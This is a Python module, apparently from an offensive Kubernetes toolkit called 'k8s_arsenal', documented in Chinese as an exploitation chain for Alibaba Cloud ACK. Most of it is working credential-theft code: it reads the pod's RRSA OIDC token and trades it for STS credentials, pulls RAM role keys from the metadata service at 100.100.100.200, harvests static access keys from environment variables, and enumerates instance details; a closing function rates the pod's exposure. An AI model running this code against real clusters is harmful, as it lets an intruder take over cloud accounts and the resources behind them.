"""Alibaba Cloud ACK 利用链

阿里云 ACK (Container Service for Kubernetes) 利用：
RAM Role 凭证窃取，ECI 元数据服务，Pod Identity 利用。
"""

import os
from typing import Any, Optional

from k8s_arsenal.cloud.base import CloudMetadataBase, CloudCredential


class AlibabaExploit(CloudMetadataBase):
    """阿里云 ACK 环境利用

    阿里云元数据服务地址为 100.100.100.200（非标准 169.254.169.254）。
    支持 ECS RAM Role 和 ACK Pod Identity (RRSA) 两种凭证获取方式。
    """

    IMDS_BASE = "http://100.100.100.200/latest"

    def detect(self) -> bool:
        """检测阿里云环境

        方法:
        1. 元数据服务端点 (100.100.100.200)
        2. DMI 产品名称
        """
        # 方法 1: 阿里云 IMDS
        resp = self._http_get(self.IMDS_BASE + "/meta-data/")
        if resp and "instance/" in resp:
            return True

        # 方法 2: DMI
        try:
            with open("/sys/class/dmi/id/product_name", "r") as f:
                name = f.read().lower()
                if any(kw in name for kw in ("alibaba", "ecs", "ecsi")):
                    return True
        except (FileNotFoundError, PermissionError):
            pass

        # 方法 3: 环境变量（阿里云 SDK 常用）
        if os.environ.get("ALIBABA_CLOUD_ACCESS_KEY_ID"):
            return True

        return False

    def get_credentials(self) -> Optional[CloudCredential]:
        """获取阿里云临时凭证

        链式利用:
        1. RRSA (ACK Pod Identity) — OIDC Token → STS AssumeRole
        2. ECS RAM Role — 元数据服务获取临时凭证
        3. 环境变量 — ALIBABA_CLOUD_ACCESS_KEY_* (静态凭证)
        """
        # 路径 1: RRSA (ACK Pod Identity)
        token_file = "/var/run/secrets/ack.alibabacloud.com/serviceaccount/token"
        role_arn = os.environ.get("ALIBABA_CLOUD_ROLE_ARN")

        try:
            with open(token_file, "r") as f:
                oidc_token = f.read().strip()
        except (FileNotFoundError, PermissionError):
            oidc_token = None

        if oidc_token and role_arn:
            cred = self._assume_role_with_oidc(role_arn, oidc_token)
            if cred:
                return cred

        # 路径 2: ECS RAM Role (元数据服务)
        cred = self._get_instance_credentials()
        if cred:
            return cred

        # 路径 3: 环境变量中的静态凭证
        access_key = os.environ.get("ALIBABA_CLOUD_ACCESS_KEY_ID")
        if access_key:
            return CloudCredential(
                provider="alibaba",
                access_key_id=access_key,
                secret_access_key=os.environ.get("ALIBABA_CLOUD_ACCESS_KEY_SECRET"),
                session_token=os.environ.get("ALIBABA_CLOUD_SECURITY_TOKEN"),
                extra={"region": os.environ.get("ALIBABA_CLOUD_REGION", "")},
            )

        return None

    def _get_instance_credentials(self) -> Optional[CloudCredential]:
        """通过元数据服务获取 ECS RAM Role 临时凭证"""
        role_name = self._http_get(
            self.IMDS_BASE + "/meta-data/ram/security-credentials/"
        )
        if not role_name:
            return None

        role_name = role_name.strip()
        cred_data = self._http_get(
            self.IMDS_BASE + f"/meta-data/ram/security-credentials/{role_name}"
        )
        if not cred_data:
            return None

        try:
            import json
            cred_json = json.loads(cred_data)
            if cred_json.get("Code") != "Success":
                return None
            return CloudCredential(
                provider="alibaba",
                access_key_id=cred_json.get("AccessKeyId"),
                secret_access_key=cred_json.get("AccessKeySecret"),
                session_token=cred_json.get("SecurityToken"),
                expires_at=cred_json.get("Expiration"),
            )
        except (json.JSONDecodeError, KeyError):
            pass

        return None

    def _assume_role_with_oidc(
        self, role_arn: str, oidc_token: str
    ) -> Optional[CloudCredential]:
        """RRSA: AssumeRoleWithOIDC

        阿里云 ACK Pod Identity 通过 OIDC Token 换取 STS 临时凭证。
        """
        import urllib.parse

        params = urllib.parse.urlencode({
            "Action": "AssumeRoleWithOIDC",
            "RoleArn": role_arn,
            "OIDCProviderArn": "acs:ram::role/oidc",
            "RoleSessionName": f"k8s-arsenal-{os.getpid()}",
            "OIDCToken": oidc_token,
        })
        sts_url = f"https://sts.aliyuncs.com/?{params}"

        resp = self._http_get(sts_url)
        if not resp:
            return None

        try:
            import json
            resp_json = json.loads(resp)
            cred = resp_json.get("Credentials", {})
            if cred:
                return CloudCredential(
                    provider="alibaba",
                    access_key_id=cred.get("AccessKeyId"),
                    secret_access_key=cred.get("AccessKeySecret"),
                    session_token=cred.get("SecurityToken"),
                    expires_at=cred.get("Expiration"),
                )
        except (json.JSONDecodeError, KeyError):
            pass

        return None

    def get_instance_info(self) -> dict:
        """获取 ECS 实例信息"""
        info: dict[str, Any] = {}

        for field in [
            "instance-id", "instance-type", "region-id",
            "zone-id", "private-ipv4", "public-ipv4",
            "vpc-id", "vswitch-id", "security-groups",
        ]:
            val = self._http_get(
                self.IMDS_BASE + f"/meta-data/{field}"
            )
            if val:
                info[field] = val.strip()

        # 获取实例名称
        hostname = self._http_get(
            self.IMDS_BASE + "/meta-data/hostname"
        )
        if hostname:
            info["hostname"] = hostname.strip()

        return info


def check_ack_risk(kubeconfig: Optional[str] = None) -> dict:
    """检查阿里云 ACK 利用风险

    检查 Pod 是否挂载了 RRSA 角色，并评估风险等级。
    """
    result = {
        "rrsa_enabled": False,
        "role_arn": None,
        "oidc_token_mounted": False,
        "risk_level": "none",
        "description": "",
    }

    # 检查 RRSA 挂载路径
    token_path = "/var/run/secrets/ack.alibabacloud.com/serviceaccount/token"
    if os.path.exists(token_path):
        result["oidc_token_mounted"] = True
        result["rrsa_enabled"] = True

    role_arn = os.environ.get("ALIBABA_CLOUD_ROLE_ARN")
    if role_arn:
        result["role_arn"] = role_arn
        result["rrsa_enabled"] = True

    if result["rrsa_enabled"]:
        result["risk_level"] = "high"
        result["description"] = "Pod 挂载了 RRSA 角色，可通过 STS 获取阿里云临时凭证"
    else:
        # 检查是否有静态凭证注入
        if os.environ.get("ALIBABA_CLOUD_ACCESS_KEY_ID"):
            result["risk_level"] = "critical"
            result["description"] = "Pod 中检测到阿里云静态 AccessKey，可访问云资源"

    return result
